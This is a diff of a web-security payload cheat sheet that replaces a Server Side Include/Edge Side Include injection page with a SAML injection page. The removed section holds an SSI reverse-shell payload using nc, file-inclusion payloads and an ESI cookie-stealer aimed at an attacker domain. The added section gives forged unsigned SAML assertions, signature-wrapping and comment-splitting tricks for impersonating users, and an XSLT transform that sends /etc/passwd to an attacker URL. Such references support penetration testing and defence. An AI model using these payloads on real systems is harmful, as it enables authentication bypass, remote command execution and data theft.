@@ -1,75 +1,200 @@
-# Server Side Include Injection
+# SAML Injection
 
-> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.
+> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.
 
 ## Summary
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-* [Edge Side Inclusion](#edge-side-inclusion)
+    * [Invalid Signature](#invalid-signature)
+    * [Signature Stripping](#signature-stripping)
+    * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
+    * [XML Comment Handling](#xml-comment-handling)
+    * [XML External Entity](#xml-external-entity)
+    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
 * [References](#references)
 
 ## Tools
 
-* [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [epinna/tplmap](https://github.com/epinna/tplmap), supports SSI detection and exploitation with `--legacy` or `-e SSI`
-
-  ```bash
-  python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
-  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
-  python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
-  ```
+* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2 Burp Extension.
+* [d0ge/XSW](https://github.com/d0ge/XSW) - XML Signature Wrapping Burp Suite Extensions.
+* [ZAP Addon/SAML Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Allows to detect, show, edit, and fuzz SAML requests.
 
 ## Methodology
 
-SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.
+A SAML Response should contain the `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.
 
-SSI format: `<!--#directive param="value" -->`
+### Invalid Signature
 
-| Description             | Payload                                                                               |
-| ----------------------- | ------------------------------------------------------------------------------------- |
-| Print the date          | `<!--#echo var="DATE_LOCAL" -->`                                                      |
-| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`                                                   |
-| Print all the variables | `<!--#printenv -->`                                                                   |
-| Setting variables       | `<!--#set var="name" value="Rich" -->`                                                |
-| Include a file          | `<!--#include file="/etc/passwd" -->`                                                 |
-| Include a file          | `<!--#include virtual="/index.html" -->`                                              |
-| Execute commands        | `<!--#exec cmd="ls" -->`                                                              |
-| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
+Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.
 
-## Edge Side Inclusion
+### Signature Stripping
 
-HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.
+> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn
 
-Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.
+The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.
 
-```ps1
-Surrogate-Control: content="ESI/1.0"
+Example of SAML assertion where `NameID=admin` without signature.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
+    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
+        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
+    </saml2p:Status>
+    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
+        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
+            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
+            </saml2:SubjectConfirmation>
+        </saml2:Subject>
+        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:AudienceRestriction>
+                <saml2:Audience>WLS_SP</saml2:Audience>
+            </saml2:AudienceRestriction>
+        </saml2:Conditions>
+        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:AuthnContext>
+                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
+            </saml2:AuthnContext>
+        </saml2:AuthnStatement>
+    </saml2:Assertion>
+</saml2p:Response>
 ```
 
-| Description        | Payload                                                                                       |
-| ------------------ | --------------------------------------------------------------------------------------------- |
-| Blind detection    | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`                                              |
-| XSS                | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`                              |
-| Cookie stealer     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>`          |
-| Include a file     | `<esi:include src="supersecret.txt">`                                                         |
-| Display debug info | `<esi:debug/>`                                                                                |
-| Add header         | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->`                          |
-| Inline fragment    | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
+### XML Signature Wrapping Attacks
 
-| Software                     |  Includes | Vars |  Cookies | Upstream Headers Required | Host Whitelist |
-| ---------------------------- | --------- | ---- | -------- | ------------------------- | -------------- |
-| Squid3                       | Yes       | Yes  | Yes      | Yes                       | No             |
-| Varnish Cache                | Yes       | No   | No       | Yes                       | Yes            |
-| Fastly                       | Yes       | No   | No       | No                        | Yes            |
-| Akamai ESI Test Server (ETS) | Yes       | Yes  | Yes      | No                        | No             |
-| NodeJS' esi                  | Yes       | Yes  | Yes      | No                        | No             |
-| NodeJS' nodesi               | Yes       | No   | No       | No                        | Optional       |
+XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.
+
+* **XSW1**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature.
+* **XSW2**: Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature.
+* **XSW3**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion.
+* **XSW4**: Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion.
+* **XSW5**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message.
+* **XSW6**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature.
+* **XSW7**: Applies to SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion.
+* **XSW8**: Applies to SAML Assertion messages. Add an “Object” block containing a copy of the original assertion with the signature removed.
+
+In the following example, these terms are used.
+
+* **FA**: Forged Assertion
+* **LA**: Legitimate Assertion
+* **LAS**: Signature of the Legitimate Assertion
+
+```xml
+<SAMLResponse>
+  <FA ID="evil">
+      <Subject>Attacker</Subject>
+  </FA>
+  <LA ID="legitimate">
+      <Subject>Legitimate User</Subject>
+      <LAS>
+         <Reference Reference URI="legitimate">
+         </Reference>
+      </LAS>
+  </LA>
+</SAMLResponse>
+```
+
+In the Github Enterprise vulnerability, this request would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.
+
+### XML Comment Handling
+
+A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) has multiple CVE in the following libraries and products.
+
+* OneLogin - python-saml - CVE-2017-11427
+* OneLogin - ruby-saml - CVE-2017-11428
+* Clever - saml2-js - CVE-2017-11429
+* OmniAuth-SAML - CVE-2017-11430
+* Shibboleth - CVE-2018-0489
+* Duo Network Gateway - CVE-2018-7340
+
+Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.
+
+```xml
+<SAMLResponse>
+    <Issuer>https://idp.com/</Issuer>
+    <Assertion ID="_id1234">
+        <Subject>
+            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
+```
+
+Where `user@user.com` is the first part of the username, and `.evil.com` is the second.
+
+### XML External Entity
+
+An alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not change, except during XML parsing.
+
+In the following example:
+
+* `&s;` will resolve to the string `"s"`
+* `&f1;` will resolve to the string `"f1"`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Response [
+  <!ENTITY s "s">
+  <!ENTITY f1 "f1">
+]>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
+  ID="_04cfe67e596b7449d05755049ba9ec28"
+  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+[...]
+  <saml2:Attribute FriendlyName="uid"
+    Name="urn:oid:0.9.2342.19200300.100.1.1"
+    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+    <saml2:AttributeValue>
+      &s;taf&f1;
+    </saml2:AttributeValue>
+  </saml2:Attribute>
+[...]
+</saml2p:Response>
+```
+
+The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.
+
+### Extensible Stylesheet Language Transformation
+
+An XSLT can be carried out by using the `transform` element.
+
+![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
+Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)
+
+```xml
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+  ...
+    <ds:Transforms>
+      <ds:Transform>
+        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:template match="doc">
+            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
+            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
+            <xsl:value-of select="unparsed-text($exploitUrl)"/>
+          </xsl:template>
+        </xsl:stylesheet>
+      </ds:Transform>
+    </ds:Transforms>
+  ...
+</ds:Signature>
+```
 
 ## References
 
-* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)
-* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)
-* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)
-* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
-* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
-* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
+* [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - Jem Jensen - March 7, 2017](https://web.archive.org/web/20171113204302/https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
+* [How to Hunt Bugs in SAML; a Methodology - Part I - Ben Risher (@epi052) - March 7, 2019](https://web.archive.org/web/20260119151024/https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
+* [How to Hunt Bugs in SAML; a Methodology - Part II - Ben Risher (@epi052) - March 13, 2019](https://web.archive.org/web/20190511102027/https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
+* [How to Hunt Bugs in SAML; a Methodology - Part III - Ben Risher (@epi052) - March 16, 2019](https://web.archive.org/web/20250619124546/https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
+* [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen - August 23, 2012](https://web.archive.org/web/20130520064525/https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
+* [Oracle Weblogic - Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - July 18, 2018](https://web.archive.org/web/20181221074856/https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
+* [SAML Burp Extension - Roland Bischofberger - July 24, 2015](https://web.archive.org/web/20260213191343/https://blog.compass-security.com/2015/07/saml-burp-extension/)
+* [SAML Security Cheat Sheet - OWASP - February 2, 2019](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
+* [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](https://web.archive.org/web/20170314055835/http://www.economyofmechanism.com/github-saml)
+* [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://web.archive.org/web/20190607070528/https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
+* [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://web.archive.org/web/20180227170113/http://kb.cert.org/vuls/id/475445)
